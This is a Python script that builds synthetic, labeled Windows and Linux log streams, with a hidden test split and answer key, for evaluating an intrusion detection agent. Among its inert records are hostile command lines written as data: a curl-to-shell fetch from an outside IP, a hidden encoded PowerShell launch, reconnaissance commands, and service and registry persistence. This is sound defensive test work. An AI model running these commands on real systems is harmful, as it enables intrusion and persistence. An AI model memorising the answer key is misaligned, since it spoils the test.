"""Build labeled development and hidden test streams in real log formats.

    python -m hids_agent.build_dataset --split dev --seed 1 --out data/dev
    python -m hids_agent.build_dataset --split hidden --seed 101 --out data/hidden-101

Each folder gets events.jsonl (attacks hidden among normal activity), labels.json
(the answer key, never read by the agent), baseline.json and allowlist.json.

Events use real field layouts: Windows Security (4624/4625/4688/7045), Sysmon
(1/11/23), ECS-style nested JSON and Linux sshd syslog lines, plus a flat FIM
agent format. Attack details are randomized per seed. The hidden split adds
variants that never appear in development, so tuning on development cannot
simply memorize them. Nothing here is executed: these are inert records.
"""
from __future__ import annotations

import argparse
import json
import random
from datetime import datetime, timezone
from hashlib import sha256
from pathlib import Path

ORIGIN = 1795939200          # 2026-12-01T00:00:00Z
DURATION = 6 * 3600
WIN_HOSTS = ["ws-fin-01", "ws-fin-02", "ws-hr-01", "ws-dev-01", "dc-01"]
LINUX_HOSTS = ["web-01", "web-02", "db-01"]
USERS = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy",
         "mallory", "niaj", "olivia", "peggy", "rupert", "sybil", "trent", "victor", "walter"]
OFFICE = {"winword": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
          "excel": r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
          "powerpnt": r"C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE",
          "outlook": r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"}
SYS32 = r"C:\Windows\System32"
SHELLS = {"cmd": SYS32 + r"\cmd.exe", "powershell": SYS32 + r"\WindowsPowerShell\v1.0\powershell.exe",
          "wscript": SYS32 + r"\wscript.exe", "mshta": SYS32 + r"\mshta.exe", "cscript": SYS32 + r"\cscript.exe"}


def iso(ts: float) -> str:
    return datetime.fromtimestamp(ts, timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def h(text: str) -> str:
    return sha256(text.encode()).hexdigest()


class Builder:
    def __init__(self, split: str, seed: int):
        self.split, self.rng = split, random.Random(seed * 7919 + (1 if split == "hidden" else 0))
        self.seed = seed
        self.rows: list[dict] = []           # (ts, rendered event)
        self.labels: list[dict] = []
        self.n = 0
        self.pid = {hst: 4000 for hst in WIN_HOSTS + LINUX_HOSTS}
        # each Windows host reports processes through one sensor format
        styles = ["sysmon", "security", "ecs"]
        self.proc_style = {hst: styles[(i + seed) % 3] for i, hst in enumerate(WIN_HOSTS)}
        self.auth_style = {hst: ("security" if i % 2 == 0 else "ecs") for i, hst in enumerate(WIN_HOSTS)}
        self.baseline: dict[str, dict] = {}
        self.allow: dict[str, list] = {"fim": [], "services": [], "process": [], "auth": []}
        self.ext_ips = [f"{self.rng.choice([45, 91, 103, 185, 193])}.{self.rng.randrange(1, 255)}."
                        f"{self.rng.randrange(1, 255)}.{self.rng.randrange(1, 255)}" for _ in range(40)]

    # ----------------------------------------------------------------- ids
    def new_id(self, host: str) -> str:
        self.n += 1
        return f"{self.split}{self.seed}-{self.n:06d}"

    def next_pid(self, host: str) -> int:
        self.pid[host] += self.rng.randrange(4, 40)
        return self.pid[host]

    def add(self, ts: float, rendered: dict) -> str:
        self.rows.append((ts, rendered))
        return rendered["__id"]

    # ----------------------------------------------------------- renderers
    def auth(self, ts, host, user, ip, ok, logon_type=3):
        eid = self.new_id(host)
        if host in LINUX_HOSTS:
            msg = (f"Accepted password for {user} from {ip} port {self.rng.randrange(30000, 65000)} ssh2" if ok
                   else f"Failed password for {'invalid user ' if user.startswith('x') else ''}{user} from {ip} "
                        f"port {self.rng.randrange(30000, 65000)} ssh2")
            ev = {"id": eid, "ts": round(ts, 3), "host": host, "program": "sshd",
                  "message": msg}
        elif self.auth_style[host] == "security":
            ev = {"EventRecordID": eid, "TimeCreated": iso(ts), "Computer": host, "EventID": 4624 if ok else 4625,
                  "TargetUserName": f"CORP\\{user}", "IpAddress": ip or "-", "LogonType": str(logon_type)}
            if not ok:
                ev["Status"] = "0xc000006d"
        else:
            ev = {"@timestamp": iso(ts), "event": {"id": eid, "category": ["authentication"],
                                                  "action": "logged-in" if ok else "logon-failed",
                                                  "outcome": "success" if ok else "failure"},
                  "host": {"name": host}, "user": {"name": user}, "source": {"ip": ip}}
        ev["__id"] = eid
        return self.add(ts, ev)

    def proc(self, ts, host, image, parent=None, cmd=None, pid=None, ppid=None, user="alice",
             hide_parent=False, sha=None):
        eid = self.new_id(host)
        pid = pid or self.next_pid(host)
        if host in LINUX_HOSTS:
            ev = {"id": eid, "ts": round(ts, 3), "host": host, "type": "process", "exe": image,
                  "pid": pid, "ppid": ppid, "cmdline": cmd or image, "uid_name": user}
            if parent and not hide_parent:
                ev["parent_exe"] = parent
        else:
            style = self.proc_style[host]
            if style == "sysmon":
                ev = {"provider": "Microsoft-Windows-Sysmon", "EventID": 1, "EventRecordID": eid,
                      "UtcTime": iso(ts), "Computer": host, "Image": image, "ProcessId": str(pid),
                      "ParentProcessId": str(ppid) if ppid else None, "CommandLine": cmd or f'"{image}"',
                      "User": f"CORP\\{user}"}
                if parent and not hide_parent:
                    ev["ParentImage"] = parent
                if sha:
                    ev["Hashes"] = f"SHA256={sha.upper()}"
            elif style == "security":
                ev = {"EventID": 4688, "EventRecordID": eid, "TimeCreated": iso(ts), "Computer": host,
                      "NewProcessName": image, "NewProcessId": hex(pid), "ProcessId": hex(ppid or 4),
                      "CommandLine": cmd or "", "SubjectUserName": user}
                if parent and not hide_parent:
                    ev["ParentProcessName"] = parent
            else:
                p = {"pid": pid, "executable": image, "command_line": cmd or image}
                if ppid or parent:
                    p["parent"] = {k: v for k, v in (("pid", ppid), ("executable", None if hide_parent else parent)) if v}
                ev = {"@timestamp": iso(ts), "event": {"id": eid, "category": ["process"], "action": "start"},
                      "host": {"name": host}, "user": {"name": user}, "process": p}
        ev["__id"] = eid
        self.add(ts, ev)
        return eid, pid

    @staticmethod
    def proc_ppid(host, pid):
        """Parent process id; each renderer formats it (4688 writes hex, Sysmon decimal)."""
        return pid

    def file(self, ts, host, path, action, sha=None, new_path=None):
        eid = self.new_id(host)
        if host in WIN_HOSTS and action in ("create", "delete") and self.proc_style[host] == "sysmon":
            ev = {"provider": "Microsoft-Windows-Sysmon", "EventID": 11 if action == "create" else 23,
                  "EventRecordID": eid, "UtcTime": iso(ts), "Computer": host, "TargetFilename": path}
            if sha:
                ev["Hashes"] = f"SHA256={sha}"
        else:
            verb = {"create": "created", "modify": "modified", "delete": "deleted", "rename": "renamed",
                    "chmod": "permissions_changed"}[action]
            ev = {"id": eid, "ts": round(ts, 3), "host": host, "type": "fim", "action": verb, "path": path}
            if sha:
                ev["sha256"] = sha
            if new_path:
                ev["new_path"] = new_path
        ev["__id"] = eid
        return self.add(ts, ev)

    def service_event(self, ts, host, name, image_path):
        eid = self.new_id(host)
        ev = {"EventID": 7045, "EventRecordID": eid, "TimeCreated": iso(ts), "Computer": host,
              "provider": "Service Control Manager", "ServiceName": name, "ImagePath": image_path,
              "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem",
              "__id": eid}
        return self.add(ts, ev)

    def label(self, kind, variant, host, ids, start, end):
        self.labels.append({"attack_id": f"{self.split}{self.seed}-{kind}-{len(self.labels) + 1}", "type": kind,
                            "variant": variant, "host": host, "start": start, "end": end, "event_ids": ids})

    # ---------------------------------------------------------- background
    def background(self):
        r = self.rng
        services = {}
        for host in WIN_HOSTS:
            services[host] = self.proc(ORIGIN + 1, host, SYS32 + r"\services.exe", SYS32 + r"\wininit.exe",
                                       user="system")[1]
        self.svc_pid = services
        for host in WIN_HOSTS + LINUX_HOSTS:
            users = r.sample(USERS, 4)
            t = ORIGIN + r.uniform(5, 60)
            while t < ORIGIN + DURATION - 60:
                kind = r.random()
                u = r.choice(users)
                if host in LINUX_HOSTS:
                    if kind < 0.25:
                        self.auth(t, host, r.choice(["deploy", "backup", "ops"]), f"10.0.{r.randrange(1, 9)}.{r.randrange(2, 250)}", True)
                    elif kind < 0.6:
                        exe = r.choice(["/usr/bin/python3", "/usr/sbin/cron", "/usr/bin/rsync", "/bin/bash", "/usr/bin/gzip"])
                        self.proc(t, host, exe, ppid=r.randrange(300, 900), cmd=f"{exe} --job {r.randrange(99)}")
                    elif kind < 0.85:
                        self.file(t, host, f"/var/log/app/{r.choice(['access', 'error', 'jobs'])}.log", "modify",
                                  h(f"{host}{t}"))
                    else:
                        self.file(t, host, f"/tmp/{r.choice(['sess', 'cache', 'upload'])}_{r.randrange(9999)}.tmp",
                                  "create")
                else:
                    if kind < 0.2:
                        self.auth(t, host, u, f"10.0.{r.randrange(1, 9)}.{r.randrange(2, 250)}", True, 2)
                    elif kind < 0.6:
                        exe = r.choice([r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                                        r"C:\Windows\explorer.exe", r"C:\Windows\System32\notepad.exe",
                                        r"C:\Program Files\Microsoft VS Code\Code.exe",
                                        r"C:\Windows\System32\taskhostw.exe"])
                        self.proc(t, host, exe, r"C:\Windows\explorer.exe", ppid=r.randrange(2000, 3000), user=u)
                    elif kind < 0.72:
                        name = r.choice(list(OFFICE))
                        _, opid = self.proc(t, host, OFFICE[name], r"C:\Windows\explorer.exe", user=u,
                                            ppid=r.randrange(2000, 3000))
                        child = r.choice([r"C:\Windows\splwow64.exe",
                                          r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                                          r"C:\Program Files\Microsoft Office\root\Office16\MSOSYNC.EXE"])
                        self.proc(t + r.uniform(5, 300), host, child, OFFICE[name],
                                  ppid=self.proc_ppid(host, opid), user=u)
                    elif kind < 0.82:
                        img = r.choice([SYS32 + r"\svchost.exe",
                                        r"C:\Program Files\Windows Defender\MsMpEng.exe",
                                        r"C:\Program Files\Vendor\Agent\agent.exe"])
                        self.proc(t, host, img, SYS32 + r"\services.exe",
                                  ppid=self.proc_ppid(host, services[host]), user="system",
                                  cmd=f'"{img}" -k netsvcs')
                    elif kind < 0.92:
                        self.file(t, host, rf"C:\Users\{u}\AppData\Local\Temp\{r.choice(['~DF', 'tmp', 'cab'])}"
                                           rf"{r.randrange(9999):04d}.tmp", "create")
                    else:
                        self.file(t, host, rf"C:\ProgramData\App\logs\run{r.randrange(9)}.log", "modify",
                                  h(f"{host}{t}"))
                t += r.expovariate(1 / 6.0)

    def lookalikes(self):
        """Benign activity shaped like attacks. None of it is labeled."""
        r = self.rng
        for _ in range(8):                                   # typos then success
            host, u = r.choice(WIN_HOSTS + LINUX_HOSTS), r.choice(USERS)
            ip = f"10.0.{r.randrange(1, 9)}.{r.randrange(2, 250)}"
            t = ORIGIN + r.uniform(600, DURATION - 900)
            for i in range(r.randrange(1, 5)):
                self.auth(t + i * r.uniform(3, 20), host, u, ip, False)
            self.auth(t + 120, host, u, ip, True)
        for _ in range(2):                                   # shared NAT address: users mistype then log in
            host, nat = r.choice(WIN_HOSTS), f"10.0.200.{r.randrange(2, 250)}"
            t = ORIGIN + r.uniform(900, DURATION - 1800)
            group = r.sample(USERS, r.randrange(6, 10))
            for i, u in enumerate(group):
                self.auth(t + i * r.uniform(1, 8), host, u, nat, False)
            for i, u in enumerate(group):
                self.auth(t + 90 + i * r.uniform(2, 15), host, u, nat, True)
        for _ in range(3):                                   # internet scanners: many failures, never a success
            host, ip = r.choice(LINUX_HOSTS), r.choice(self.ext_ips[30:])
            t = ORIGIN + r.uniform(300, DURATION - 900)
            for i in range(r.randrange(10, 60)):
                self.auth(t + i * r.uniform(0.5, 4), host, r.choice(["root", "admin", "xtest", "xoracle"]), ip, False)
        for host in r.sample(WIN_HOSTS, 3):                  # admin installs services from Program Files
            t = ORIGIN + r.uniform(600, DURATION - 600)
            img = r"C:\Program Files\Backup\bkagent.exe"
            self.proc(t, host, SYS32 + r"\sc.exe", SYS32 + r"\cmd.exe", user="admin",
                      cmd=f'sc.exe create BkAgent binPath= "{img}" start= auto')
            self.service_event(t + 1, host, "BkAgent", f'"{img}" -service')
            self.proc(t + 2, host, img, SYS32 + r"\services.exe", ppid=self.proc_ppid(host, self.svc_pid[host]),
                      user="system")
        host = r.choice(WIN_HOSTS)                           # approved patch service running from Windows\Temp
        patch = r"C:\Windows\Temp\PatchSvc\patch.exe"
        self.allow["services"].append({"host": host, "name": "patchsvc", "path": patch})
        t = ORIGIN + r.uniform(600, DURATION - 600)
        self.service_event(t, host, "PatchSvc", patch)
        self.proc(t + 2, host, patch, SYS32 + r"\services.exe", ppid=self.proc_ppid(host, self.svc_pid[host]),
                  user="system")
        host = r.choice(WIN_HOSTS)                           # approved reporting macro
        cmd = r"cmd /c \\fileserver\macros\report.bat"
        self.allow["process"].append({"host": host, "parent": "excel.exe", "child": "cmd.exe",
                                      "cmdline_regex": r"cmd /c \\\\fileserver\\macros\\report\.bat"})
        t = ORIGIN + r.uniform(600, DURATION - 600)
        _, xpid = self.proc(t, host, OFFICE["excel"], r"C:\Windows\explorer.exe")
        self.proc(t + 30, host, SHELLS["cmd"], OFFICE["excel"], cmd=cmd, ppid=self.proc_ppid(host, xpid))
        host = r.choice(WIN_HOSTS)                           # PID reuse: Word exits, Notepad reuses its PID
        t = ORIGIN + r.uniform(600, DURATION - 900)
        pid = self.next_pid(host)
        self.proc(t, host, OFFICE["winword"], r"C:\Windows\explorer.exe", pid=pid)
        self.proc(t + 400, host, SYS32 + r"\notepad.exe", r"C:\Windows\explorer.exe", pid=pid)
        self.proc(t + 401, host, SHELLS["cmd"], ppid=self.proc_ppid(host, pid), hide_parent=True)

    # -------------------------------------------------------------- attacks
    def attacks(self):
        r, hidden = self.rng, self.split == "hidden"
        slots = sorted(r.sample(range(900, DURATION - 1500, 300), 24))
        plan = (["bf_classic", "bf_ssh", "bf_spray", "bf_distributed", "bf_slow",
                 "office_direct", "office_chain", "office_pid_only", "office_outlook",
                 "svc_sc_start", "svc_7045", "svc_systemd", "svc_powershell",
                 "fim_modify", "fim_delete", "fim_after_approval"]
                + (["bf_rdp_burst", "office_sideload", "office_linux", "svc_short_path", "svc_reg",
                    "fim_rename_onto", "fim_sudoers"] if hidden else []))
        r.shuffle(plan)
        for kind, t in zip(plan, slots):
            getattr(self, kind)(ORIGIN + t + r.uniform(0, 120))

    def _bf(self, t, host, user, ips, n, gap, variant, success_ip=None, users=None):
        ids, ts = [], t
        for i in range(n):
            u = users[i % len(users)] if users else user
            ids.append(self.auth(ts, host, u, ips[i % len(ips)], False, 10))
            ts += gap()
        ok_user = users[self.rng.randrange(len(users))] if users else user
        ids.append(self.auth(ts + self.rng.uniform(2, 90), host, ok_user, success_ip or ips[0], True, 10))
        self.label("bruteforce", variant, host, ids, t, ts + 90)

    def bf_classic(self, t):
        host = self.rng.choice(WIN_HOSTS)
        self._bf(t, host, self.rng.choice(USERS), [self.rng.choice(self.ext_ips)], self.rng.randrange(6, 30),
                 lambda: self.rng.uniform(0.5, 8), "classic")

    def bf_rdp_burst(self, t):
        host = self.rng.choice(WIN_HOSTS)
        self._bf(t, host, "administrator", [self.rng.choice(self.ext_ips)], self.rng.randrange(80, 200),
                 lambda: self.rng.uniform(0.05, 0.5), "rdp_burst")

    def bf_ssh(self, t):
        host = self.rng.choice(LINUX_HOSTS)
        self._bf(t, host, self.rng.choice(["root", "deploy", "ubuntu"]), [self.rng.choice(self.ext_ips)],
                 self.rng.randrange(5, 40), lambda: self.rng.uniform(1, 12), "ssh")

    def bf_spray(self, t):
        host = self.rng.choice(WIN_HOSTS)
        self._bf(t, host, None, [self.rng.choice(self.ext_ips)], self.rng.randrange(6, 14),
                 lambda: self.rng.uniform(1, 15), "spray", users=self.rng.sample(USERS, self.rng.randrange(6, 12)))

    def bf_distributed(self, t):
        host, user = self.rng.choice(WIN_HOSTS + LINUX_HOSTS), self.rng.choice(["admin", "svc_sql", "root"])
        ips = self.rng.sample(self.ext_ips[:30], self.rng.randrange(3, 6))
        self._bf(t, host, user, ips, self.rng.randrange(6, 16), lambda: self.rng.uniform(2, 15), "distributed",
                 success_ip=ips[-1])

    def bf_slow(self, t):
        host = self.rng.choice(WIN_HOSTS + LINUX_HOSTS)
        n = self.rng.randrange(5, 8)
        self._bf(t, host, self.rng.choice(USERS), [self.rng.choice(self.ext_ips)], n,
                 lambda: self.rng.uniform(30, 280 / (n - 1)), "slow")

    def _office(self, t, host, office, chain, variant, hide=False, cmd=None):
        _, opid = self.proc(t, host, office, r"C:\Windows\explorer.exe", user=self.rng.choice(USERS),
                            ppid=self.rng.randrange(2000, 3000))
        ids, parent, ppid, ts = [], office, opid, t + self.rng.uniform(3, 60)
        for i, child in enumerate(chain):
            c = cmd if (cmd and i == 0) else (
                "powershell -nop -w hidden -enc " + "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" if "powershell" in child
                else f'cmd /c "{child}"')
            eid, ppid_new = self.proc(ts, host, child, parent, cmd=c, ppid=self.proc_ppid(host, ppid),
                                      hide_parent=hide)
            ids.append(eid)
            parent, ppid, ts = child, ppid_new, ts + self.rng.uniform(0.2, 5)
        self.label("office_shell", variant, host, ids, t, ts)

    def office_direct(self, t):
        name = self.rng.choice(["winword", "excel", "powerpnt"])
        self._office(t, self.rng.choice(WIN_HOSTS), OFFICE[name], [self.rng.choice([SHELLS["cmd"], SHELLS["powershell"]])],
                     "direct", cmd="cmd /c whoami & net user")

    def office_chain(self, t):
        self._office(t, self.rng.choice(WIN_HOSTS), OFFICE["winword"], [SHELLS["cmd"], SHELLS["powershell"]], "chain")

    def office_pid_only(self, t):
        self._office(t, self.rng.choice(WIN_HOSTS), OFFICE["excel"], [SHELLS["powershell"]], "pid_only", hide=True)

    def office_outlook(self, t):
        self._office(t, self.rng.choice(WIN_HOSTS), OFFICE["outlook"], [self.rng.choice([SHELLS["wscript"], SHELLS["mshta"]])],
                     "outlook_script")

    def office_sideload(self, t):
        # shape of the real EVTX-ATTACK-SAMPLES sideloading sample: fake WINWORD.exe in AppData\Roaming
        self._office(t, self.rng.choice(WIN_HOSTS), r"C:\Users\IEUser\AppData\Roaming\WINWORD.exe",
                     [r"C:\Windows\SysWOW64\cmd.exe"], "sideload",
                     cmd=r'cmd /c ping 127.0.0.1&&del /F /Q /A:H "C:\Users\IEUser\AppData\Roaming\wwlib.dll"')

    def office_linux(self, t):
        host = self.rng.choice(LINUX_HOSTS)
        _, opid = self.proc(t, host, "/usr/lib/libreoffice/program/soffice.bin", ppid=900,
                            cmd="soffice.bin --writer invoice.odt")
        eid, _ = self.proc(t + 4, host, "/bin/sh", "/usr/lib/libreoffice/program/soffice.bin", ppid=opid,
                           cmd="sh -c curl -s http://198.51.100.7/x | sh", hide_parent=True)
        self.label("office_shell", "linux_soffice", host, [eid], t, t + 4)

    def _temp_binary(self, host, short=False):
        u = self.rng.choice(USERS)
        name = self.rng.choice(["svchost", "updater", "msupd", "helper"]) + f"{self.rng.randrange(99)}.exe"
        if short:
            return rf"C:\Users\{u.upper()[:6]}~1\AppData\Local\Temp\{name}"
        return self.rng.choice([rf"C:\Users\{u}\AppData\Local\Temp\{name}", rf"C:\Windows\Temp\{name}"])

    def svc_sc_start(self, t):
        host, binp = self.rng.choice(WIN_HOSTS), self._temp_binary(self.rng.choice(WIN_HOSTS))
        name = f"WinUpd{self.rng.randrange(99)}"
        a = self.file(t, host, binp, "create")
        b, _ = self.proc(t + 3, host, SYS32 + r"\sc.exe", SYS32 + r"\cmd.exe",
                         cmd=f'sc.exe create {name} binPath= "{binp}" start= auto')
        c, _ = self.proc(t + 5, host, binp, SYS32 + r"\services.exe", ppid=self.proc_ppid(host, self.svc_pid[host]),
                         user="system")
        self.label("temp_service", "sc_create_start", host, [a, b, c], t, t + 5)

    def svc_7045(self, t):
        host, binp = self.rng.choice(WIN_HOSTS), self._temp_binary("x")
        e = self.service_event(t, host, f"Svc{self.rng.randrange(999)}", f'"{binp}" -k run')
        self.label("temp_service", "service_install_event", host, [e], t, t)

    def svc_short_path(self, t):
        host = self.rng.choice(WIN_HOSTS)
        e = self.service_event(t, host, f"Upd{self.rng.randrange(999)}", self._temp_binary("x", short=True))
        self.label("temp_service", "short_8.3_path", host, [e], t, t)

    def svc_powershell(self, t):
        host = self.rng.choice(WIN_HOSTS)
        e, _ = self.proc(t, host, SHELLS["powershell"], r"C:\Windows\explorer.exe",
                         cmd='powershell New-Service -Name "WinSvc" -BinaryPathName "%TEMP%\\winsvc.exe"')
        self.label("temp_service", "powershell_new_service", host, [e], t, t)

    def svc_reg(self, t):
        host = self.rng.choice(WIN_HOSTS)
        e, _ = self.proc(t, host, SYS32 + r"\reg.exe", SHELLS["cmd"],
                         cmd=r'reg add HKLM\SYSTEM\CurrentControlSet\Services\WinDefendUpd /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\wdu.exe" /f')
        self.label("temp_service", "registry_imagepath", host, [e], t, t)

    def svc_systemd(self, t):
        host = self.rng.choice(LINUX_HOSTS)
        binp = f"/tmp/.{self.rng.choice(['kworker', 'dbus', 'cache'])}{self.rng.randrange(99)}"
        a = self.file(t, host, binp, "create")
        b, _ = self.proc(t + 6, host, binp, "/usr/lib/systemd/systemd", ppid=1, user="root")
        self.label("temp_service", "systemd_tmp", host, [a, b], t, t + 6)

    def _baselined(self, host, path):
        sha = h(f"{host}:{path}:v1")
        self.baseline.setdefault(host, {})[path] = {"sha256": sha}
        return sha

    def fim_modify(self, t):
        host = self.rng.choice(LINUX_HOSTS)
        path = self.rng.choice(["/etc/passwd", "/etc/ssh/sshd_config", "/etc/crontab"])
        self._baselined(host, path)
        e = self.file(t, host, path, "modify", h(f"evil{t}"))
        self.label("fim", "modify", host, [e], t, t)

    def fim_sudoers(self, t):
        host = self.rng.choice(LINUX_HOSTS)
        self._baselined(host, "/etc/sudoers")
        e = self.file(t, host, "/etc/sudoers", "modify", h(f"sudo{t}"))
        self.label("fim", "modify_sudoers", host, [e], t, t)

    def fim_delete(self, t):
        host = self.rng.choice(WIN_HOSTS)
        path = r"C:\Windows\System32\drivers\etc\hosts"
        self._baselined(host, path)
        e = self.file(t, host, path, "delete")
        self.label("fim", "delete", host, [e], t, t)

    def fim_rename_onto(self, t):
        host = self.rng.choice(LINUX_HOSTS)
        self._baselined(host, "/etc/ld.so.preload")
        e = self.file(t, host, "/tmp/.p", "rename", h(f"preload{t}"), new_path="/etc/ld.so.preload")
        self.label("fim", "rename_onto", host, [e], t, t)

    def fim_after_approval(self, t):
        host = self.rng.choice(LINUX_HOSTS)
        path = "/etc/nginx/nginx.conf"
        self._baselined(host, path)
        approved = h(f"{host}:nginx:v2")
        self.allow["fim"].append({"host": host, "path": path, "hash": approved, "ticket": f"CHG-{self.rng.randrange(1000, 9999)}"})
        self.file(t, host, path, "modify", approved)                      # approved: no alert
        self.file(t + 400, host, path, "modify", approved)                # same content again: no alert
        e = self.file(t + 900, host, path, "modify", h(f"tamper{t}"))
        self.label("fim", "change_after_approval", host, [e], t + 900, t + 900)

    def fim_noise(self):
        """Same-hash rewrites of baselined files: must stay quiet."""
        for host, files in list(self.baseline.items()):
            for path, hashes in files.items():
                self.file(ORIGIN + self.rng.uniform(100, 800), host, path, "modify", hashes["sha256"])

    # ---------------------------------------------------------------- output
    def build(self):
        self.background()
        self.lookalikes()
        self.attacks()
        self.fim_noise()
        self.rows.sort(key=lambda x: x[0])
        events = [e for _, e in self.rows]
        r = self.rng
        # real-world delivery problems: late records, a replayed duplicate, a corrupt line
        for i in r.sample(range(len(events) - 2), len(events) // 400):
            events[i], events[i + 1] = events[i + 1], events[i]
        dupes = r.sample(range(len(events)), 3)
        return events, dupes


def write(folder: Path, split: str, seed: int) -> dict:
    b = Builder(split, seed)
    events, dupes = b.build()
    folder.mkdir(parents=True, exist_ok=True)
    with open(folder / "events.jsonl", "w", encoding="utf-8") as f:
        for i, e in enumerate(events):
            row = {k: v for k, v in e.items() if k != "__id"}
            line = json.dumps(row)
            f.write(line + "\n")
            if i in dupes:
                f.write(line + "\n")
            if i == len(events) // 2:
                f.write('{"id": "corrupt", "ts": \n')
    (folder / "labels.json").write_text(json.dumps(b.labels, indent=1), encoding="utf-8")
    (folder / "baseline.json").write_text(json.dumps({"hosts": b.baseline}, indent=1), encoding="utf-8")
    (folder / "allowlist.json").write_text(json.dumps(b.allow, indent=1), encoding="utf-8")
    return {"events": len(events), "attacks": len(b.labels), "split": split, "seed": seed}


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--split", choices=["dev", "hidden"], required=True)
    p.add_argument("--seed", type=int, required=True)
    p.add_argument("--out", required=True)
    a = p.parse_args(argv)
    print(json.dumps(write(Path(a.out), a.split, a.seed)))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
